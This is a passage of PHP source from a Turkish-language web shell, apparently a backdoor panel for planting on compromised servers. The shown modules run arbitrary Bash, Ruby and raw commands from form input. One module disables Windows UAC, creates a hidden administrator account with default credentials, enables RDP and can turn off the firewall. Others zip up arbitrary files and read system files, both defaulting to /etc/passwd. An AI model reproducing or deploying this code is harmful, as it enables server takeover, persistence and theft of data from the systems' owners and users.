mt-10"><i class="bi bi-play"></i> Çalıştır</button></form>';}elseif($s=='Ruby'){if(isset($_POST['ruby_cmd'])){$c=$_POST['ruby_cmd']; system("ruby -e \"$c\" 2>&1");} echo '<form method="post"><input type="text" class="form-control" name="ruby_cmd" placeholder="puts \'hello\'"><button type="submit" class="btn btn-primary mt-10"><i class="bi bi-play"></i> Çalıştır</button></form>';}elseif($s=='Bash'){if(isset($_POST['bash_cmd'])){$c=$_POST['bash_cmd']; system("bash -c \"$c\" 2>&1");} echo '<form method="post"><input type="text" class="form-control" name="bash_cmd" placeholder="ls -la"><button type="submit" class="btn btn-primary mt-10"><i class="bi bi-play"></i> Çalıştır</button></form>';}else{if(isset($_POST['cgi_cmd'])){$c=$_POST['cgi_cmd']; system("$c 2>&1");} echo '<form method="post"><input type="text" class="form-control" name="cgi_cmd" placeholder="id"><button type="submit" class="btn btn-primary mt-10"><i class="bi bi-play"></i> Çalıştır</button></form>';} echo '</div></div>';} ?></div></div></div>
<?php endif; ?>
<?php if($action == 'win_admin'): ?>
<div class="card"><div class="card-header"><i class="bi bi-windows"></i> WINDOWS ADMIN EKLE + UAC BYPASS + RDP</div><div class="card-body"><?php if(!$is_windows) { echo '<div class="alert alert-warning"><i class="bi bi-exclamation-triangle"></i> Bu araç sadece Windows sistemlerde çalışır.</div>'; } else { if(isset($_POST['win_user']) && isset($_POST['win_pass'])) { $user = $_POST['win_user']; $pass = $_POST['win_pass']; echo '<div class="alert alert-info"><i class="bi bi-info-circle"></i> İşlemler başlatılıyor...</div>'; $uac_bypass = execute_command('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f'); echo '<div class="terminal"><pre>UAC Bypass: ' . htmlspecialchars($uac_bypass) . '</pre></div>'; $add = execute_command("net user $user $pass /add"); if(strpos($add, 'successfully') !== false) { echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Kullanıcı oluşturuldu: ' . $user . '</div>'; $admin_add = execute_command("net localgroup Administrators $user /add"); if(strpos($admin_add, 'successfully') !== false) echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Kullanıcı Administrators grubuna eklendi.</div>'; $rdp_add = execute_command("net localgroup \"Remote Desktop Users\" $user /add"); if(strpos($rdp_add, 'successfully') !== false) echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Kullanıcı Remote Desktop Users grubuna eklendi.</div>'; execute_command("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"); execute_command("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes"); if(isset($_POST['disable_firewall'])) { execute_command("netsh advfirewall set allprofiles state off"); echo '<div class="alert alert-warning"><i class="bi bi-shield"></i> Firewall kapatıldı.</div>'; } execute_command("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SebDebugPrivilege\" /v $user /t REG_DWORD /d 1 /f"); echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> İşlemler tamamlandı! Kullanıcı giriş yapabilir.</div>'; } else { echo '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Kullanıcı oluşturulamadı: ' . htmlspecialchars($add) . '</div>'; } } ?><form method="post"><div class="form-group"><label><i class="bi bi-person"></i> Kullanıcı adı:</label><input type="text" class="form-control" name="win_user" placeholder="Kullanıcı adı" value="w4rnight"></div><div class="form-group"><label><i class="bi bi-lock"></i> Şifre:</label><input type="password" class="form-control" name="win_pass" placeholder="Şifre" value="W4rNight2026!"></div><div class="checkbox-wrapper"><input type="checkbox" name="disable_firewall" id="disable_firewall"><label for="disable_firewall"><i class="bi bi-shield-x"></i> Firewall'u da kapat</label></div><button type="submit" class="btn btn-primary"><i class="bi bi-person-plus"></i> Admin Ekle</button></form><?php } ?></div></div>
<?php endif; ?>
<?php if($action == 'zip_pack'): ?>
<div class="card"><div class="card-header"><i class="bi bi-file-zip"></i> ZIP PACKER</div><div class="card-body"><?php if(isset($_POST['files'])&&isset($_POST['zipname'])){$fs=explode("\n",$_POST['files']); $zn=$_POST['zipname'].'.zip'; $pw=$_POST['password']??''; $zip=new ZipArchive(); if($zip->open($zn,ZipArchive::CREATE)!==true) echo '<div class="alert alert-danger">ZIP oluşturulamadı!</div>'; else{foreach($fs as $f){$f=trim($f); if(file_exists($f)){if(is_file($f)) $zip->addFile($f,basename($f)); elseif(is_dir($f)){$fs2=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f)); foreach($fs2 as $ff){if($ff->isDir()) continue; $local=str_replace($f,basename($f).'/',$ff->getPathname()); $zip->addFile($ff->getPathname(),$local);}}}} $zip->close(); if($pw) execute_command("zip -P $pw $zn.zip ".implode(' ',$fs)); echo '<div class="alert alert-success"><a href="'.$zn.'" class="btn btn-primary"><i class="bi bi-download"></i> ZIP İndir</a></div>';}} ?><form method="post"><textarea class="form-control" name="files" rows="5" placeholder="Dosya/klasör yolları">/etc/passwd</textarea><input type="text" class="form-control mt-10" name="zipname" placeholder="ZIP adı" value="archive"><input type="text" class="form-control mt-10" name="password" placeholder="Şifre (opsiyonel)"><button type="submit" class="btn btn-primary mt-20"><i class="bi bi-file-zip"></i> ZIP Oluştur</button></form></div></div>
<?php endif; ?>
<?php if($action == 'symlink'): ?>
<div class="card"><div class="card-header"><i class="bi bi-link"></i> SMART BYPASS</div><div class="card-body"><?php if(isset($_POST['target_file'])){ $target=$_POST['target_file']; $content=smart_read_file($target); if($content) echo '<div class="terminal"><pre>'.htmlspecialchars($content).'</pre></div>'; else echo '<div class="alert alert-danger">Dosya okunamadı!</div>'; } ?><form method="post"><input type="text" name="target_file" class="form-control" placeholder="/etc/passwd" value="/etc/passwd"><button type="submit" class="btn btn-primary mt-10">Oku</button></form></div></div>
<?php endif; ?>
<?php if($action == 'logout'): ?>
<?php session_destroy(); setcookie(COOKIE_NAME, '', time()-3600, '/'); ?>
<meta http-equiv="refresh" content="0;url=<?php echo SELF; ?>">
<?php endif; ?>
</div>
</body>
</html>
